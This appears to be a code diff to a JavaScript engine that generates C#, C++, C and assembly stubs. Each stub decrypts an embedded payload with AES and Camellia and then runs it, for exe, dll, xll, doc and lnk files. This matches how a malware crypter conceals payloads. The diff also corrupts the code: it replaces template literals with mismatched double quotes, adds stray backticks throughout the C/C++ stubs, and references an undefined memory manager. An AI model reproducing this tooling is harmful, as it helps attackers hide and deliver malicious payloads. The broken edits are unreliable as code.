@@ -6,6 +6,19 @@ const path = require('path');
 const nativeCompiler = require('./native-compiler');
 
 class DualCryptoEngine {
+    // Performance monitoring
+    static performance = {
+        monitor: (fn) => {
+            const start = process.hrtime.bigint();
+            const result = fn();
+            const end = process.hrtime.bigint();
+            const duration = Number(end - start) / 1000000; // Convert to milliseconds
+            if (duration > 100) { // Log slow operations
+                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+            }
+            return result;
+        }
+    }
   constructor() {
     this.name = 'Dual Crypto Engine (AES + Camellia)';
     this.supportedAlgorithms = [
@@ -17,7 +30,7 @@ class DualCryptoEngine {
     ];
     this.supportedFormats = ['csharp', 'cpp', 'c', 'assembly', 'exe', 'dll', 'xll', 'doc', 'lnk'];
     this.generators = {};
-    this.hotPatchers = new Map();
+    this.hotPatchers = this.memoryManager.createManagedCollection('hotPatchers', 'Map', 100);
     this.initialized = false;
   }
 
@@ -92,7 +105,7 @@ class DualCryptoEngine {
     }
     
     try {
-      console.log(`[INFO] Loading ${name} generator on demand...`);
+      console.log("[INFO] Loading " + name + " generator on demand...");
       
       switch (name) {
         case 'aes':
@@ -112,10 +125,10 @@ class DualCryptoEngine {
         await this.generators[name].initialize();
       }
       
-      console.log(`[OK] ${name} generator loaded successfully`);
+      console.log("[OK] " + name + " generator loaded successfully");
       return this.generators[name];
     } catch (error) {
-      console.error(`[ERROR] Failed to load ${name} generator:`, error.message);
+      console.error("[ERROR] Failed to load " + name + " generator:", error.message);
       this.generators[name] = null;
       return null;
     }
@@ -362,7 +375,7 @@ class DualCryptoEngine {
     const aesIVHex = ivs.aes.toString('hex');
     const camelliaIVHex = ivs.camellia.toString('hex');
 
-    return `using System;
+    return "using System;
 using System.Security.Cryptography;
 using System.Text;
 using System.Runtime.InteropServices;
@@ -385,7 +398,7 @@ class DualCryptoDecryptor
             byte[] decryptedData = DecryptDual(encryptedData);
             
             // Handle based on file type
-            HandleFileType("${fileType}", decryptedData);
+            HandleFileType(`${fileType}`, decryptedData);
         }
         catch (Exception ex)
         {
@@ -498,7 +511,7 @@ class DualCryptoDecryptor
     
     [DllImport("kernel32.dll")]
     private static extern IntPtr LoadLibrary(byte[] data);
-}`;
+}";
   }
 
   generateCppDualStub(algorithm, keys, ivs, fileType) {
@@ -507,28 +520,28 @@ class DualCryptoDecryptor
     const aesIVHex = ivs.aes.toString('hex');
     const camelliaIVHex = ivs.camellia.toString('hex');
 
-    return `#include <iostream>
-#include <vector>
-#include <string>
-#include <openssl/evp.h>
-#include <openssl/camellia.h>
-#include <windows.h>
+    return "#include <iostream>`
+#include <vector>`
+#include <string>`
+#include <openssl/evp.h>`
+#include <openssl/camellia.h>`
+#include <windows.h>`
 
 class DualCryptoDecryptor {
 private:
-    static const std::vector<unsigned char> AES_KEY;
-    static const std::vector<unsigned char> CAMELLIA_KEY;
-    static const std::vector<unsigned char> AES_IV;
-    static const std::vector<unsigned char> CAMELLIA_IV;
+    static const std::vector<unsigned char>` AES_KEY;
+    static const std::vector<unsigned char>` CAMELLIA_KEY;
+    static const std::vector<unsigned char>` AES_IV;
+    static const std::vector<unsigned char>` CAMELLIA_IV;
     
 public:
     static void decryptAndExecute() {
         try {
             // Load encrypted data
-            std::vector<unsigned char> encryptedData = loadEncryptedData();
+            std::vector<unsigned char>` encryptedData = loadEncryptedData();
             
             // Decrypt using dual encryption
-            std::vector<unsigned char> decryptedData = decryptDual(encryptedData);
+            std::vector<unsigned char>` decryptedData = decryptDual(encryptedData);
             
             // Handle based on file type
             handleFileType("${fileType}", decryptedData);
@@ -539,19 +552,19 @@ public:
     }
     
 private:
-    static std::vector<unsigned char> decryptDual(const std::vector<unsigned char>& encryptedData) {
+    static std::vector<unsigned char>` decryptDual(const std::vector<unsigned char>`& encryptedData) {
         // First decrypt with Camellia
-        std::vector<unsigned char> camelliaDecrypted = decryptCamellia(encryptedData);
+        std::vector<unsigned char>` camelliaDecrypted = decryptCamellia(encryptedData);
         
         // Then decrypt with AES
-        std::vector<unsigned char> aesDecrypted = decryptAES(camelliaDecrypted);
+        std::vector<unsigned char>` aesDecrypted = decryptAES(camelliaDecrypted);
         
         return aesDecrypted;
     }
     
-    static std::vector<unsigned char> decryptAES(const std::vector<unsigned char>& encryptedData) {
+    static std::vector<unsigned char>` decryptAES(const std::vector<unsigned char>`& encryptedData) {
         EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
-        std::vector<unsigned char> decryptedData(encryptedData.size());
+        std::vector<unsigned char>` decryptedData(encryptedData.size());
         int len;
         
         EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, AES_KEY.data(), AES_IV.data());
@@ -562,9 +575,9 @@ private:
         return decryptedData;
     }
     
-    static std::vector<unsigned char> decryptCamellia(const std::vector<unsigned char>& encryptedData) {
+    static std::vector<unsigned char>` decryptCamellia(const std::vector<unsigned char>`& encryptedData) {
         EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
-        std::vector<unsigned char> decryptedData(encryptedData.size());
+        std::vector<unsigned char>` decryptedData(encryptedData.size());
         int len;
         
         EVP_DecryptInit_ex(ctx, EVP_camellia_256_cbc(), NULL, CAMELLIA_KEY.data(), CAMELLIA_IV.data());
@@ -575,12 +588,12 @@ private:
         return decryptedData;
     }
     
-    static std::vector<unsigned char> loadEncryptedData() {
+    static std::vector<unsigned char>` loadEncryptedData() {
         // Implementation to load encrypted data
-        return std::vector<unsigned char>();
+        return std::vector<unsigned char>`();
     }
     
-    static void handleFileType(const std::string& fileType, const std::vector<unsigned char>& data) {
+    static void handleFileType(const std::string& fileType, const std::vector<unsigned char>`& data) {
         if (fileType == "xll") {
             loadXllFile(data);
         } else if (fileType == "doc") {
@@ -592,35 +605,35 @@ private:
         }
     }
     
-    static void loadXllFile(const std::vector<unsigned char>& data) {
+    static void loadXllFile(const std::vector<unsigned char>`& data) {
         HMODULE hModule = LoadLibraryA((LPCSTR)data.data());
         if (hModule) {
             std::cout << "XLL file loaded successfully" << std::endl;
         }
     }
     
-    static void openDocument(const std::vector<unsigned char>& data) {
+    static void openDocument(const std::vector<unsigned char>`& data) {
         ShellExecuteA(NULL, "open", "notepad.exe", NULL, NULL, SW_SHOW);
     }
     
-    static void executeShortcut(const std::vector<unsigned char>& data) {
+    static void executeShortcut(const std::vector<unsigned char>`& data) {
         std::cout << "Shortcut executed" << std::endl;
     }
     
-    static void executeBinary(const std::vector<unsigned char>& data) {
+    static void executeBinary(const std::vector<unsigned char>`& data) {
         std::cout << "Binary executed successfully" << std::endl;
     }
 };
 
-const std::vector<unsigned char> DualCryptoDecryptor::AES_KEY = {${this.hexToCppArray(aesKeyHex)}};
-const std::vector<unsigned char> DualCryptoDecryptor::CAMELLIA_KEY = {${this.hexToCppArray(camelliaKeyHex)}};
-const std::vector<unsigned char> DualCryptoDecryptor::AES_IV = {${this.hexToCppArray(aesIVHex)}};
-const std::vector<unsigned char> DualCryptoDecryptor::CAMELLIA_IV = {${this.hexToCppArray(camelliaIVHex)}};
+const std::vector<unsigned char>` DualCryptoDecryptor::AES_KEY = {${this.hexToCppArray(aesKeyHex)}};
+const std::vector<unsigned char>` DualCryptoDecryptor::CAMELLIA_KEY = {${this.hexToCppArray(camelliaKeyHex)}};
+const std::vector<unsigned char>` DualCryptoDecryptor::AES_IV = {${this.hexToCppArray(aesIVHex)}};
+const std::vector<unsigned char>` DualCryptoDecryptor::CAMELLIA_IV = {" + this.hexToCppArray(camelliaIVHex) + "};
 
 int main() {
     DualCryptoDecryptor::decryptAndExecute();
     return 0;
-}`;
+}";
   }
 
   generateCDualStub(algorithm, keys, ivs, fileType) {
@@ -629,12 +642,12 @@ int main() {
     const aesIVHex = ivs.aes.toString('hex');
     const camelliaIVHex = ivs.camellia.toString('hex');
 
-    return `#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <openssl/evp.h>
-#include <openssl/camellia.h>
-#include <windows.h>
+    return "#include <stdio.h>`
+#include <stdlib.h>`
+#include <string.h>`
+#include <openssl/evp.h>`
+#include <openssl/camellia.h>`
+#include <windows.h>`
 
 static const unsigned char AES_KEY[] = {${this.hexToCArray(aesKeyHex)}};
 static const unsigned char CAMELLIA_KEY[] = {${this.hexToCArray(camelliaKeyHex)}};
@@ -650,7 +663,7 @@ void decryptAndExecute() {
     decryptDual(encryptedData, encryptedLen, decryptedData);
     
     // Handle based on file type
-    handleFileType("${fileType}", decryptedData, encryptedLen);
+    handleFileType(`${fileType}`, decryptedData, encryptedLen);
     
     free(encryptedData);
     free(decryptedData);
@@ -738,7 +751,7 @@ void executeBinary(unsigned char* data) {
 int main() {
     decryptAndExecute();
     return 0;
-}`;
+}";
   }
 
   generateAssemblyDualStub(algorithm, keys, ivs, fileType) {
@@ -747,7 +760,7 @@ int main() {
     const aesIVHex = ivs.aes.toString('hex');
     const camelliaIVHex = ivs.camellia.toString('hex');
 
-    return `; Dual Crypto Decryption Stub in Assembly
+    return "; Dual Crypto Decryption Stub in Assembly
 ; RawrZ Security Platform - AES + Camellia Implementation
 
 section .data
@@ -755,7 +768,7 @@ section .data
     camellia_key db ${this.hexToAsmArray(camelliaKeyHex)}
     aes_iv db ${this.hexToAsmArray(aesIVHex)}
     camellia_iv db ${this.hexToAsmArray(camelliaIVHex)}
-    file_type db "${fileType}", 0
+    file_type db `${fileType}`, 0
     success_msg db 'Dual decryption successful', 0
     error_msg db 'Dual decryption failed', 0
 
@@ -825,7 +838,7 @@ handle_lnk:
 
 handle_exe:
     ; Execute binary
-    ret`;
+    ret";
   }
 
   generateStubConversion(options) {
@@ -869,7 +882,7 @@ handle_exe:
   generateExtensionChangeInstructions(targetExtension, preserveOriginal = true) {
     const instructions = {
       windows: [
-        `ren "system_file" "system_file${targetExtension}"`,
+        "ren "system_file" `system_file${targetExtension}`",
         preserveOriginal ? 'copy "system_file" "system_file.backup"' : null
       ].filter(Boolean),
       linux: [
@@ -877,7 +890,7 @@ handle_exe:
         preserveOriginal ? 'cp system_file system_file.backup' : null
       ].filter(Boolean),
       powershell: [
-        `Rename-Item "system_file" "system_file${targetExtension}"`,
+        "Rename-Item "system_file" `system_file${targetExtension}`",
         preserveOriginal ? 'Copy-Item "system_file" "system_file.backup"' : null
       ].filter(Boolean)
     };
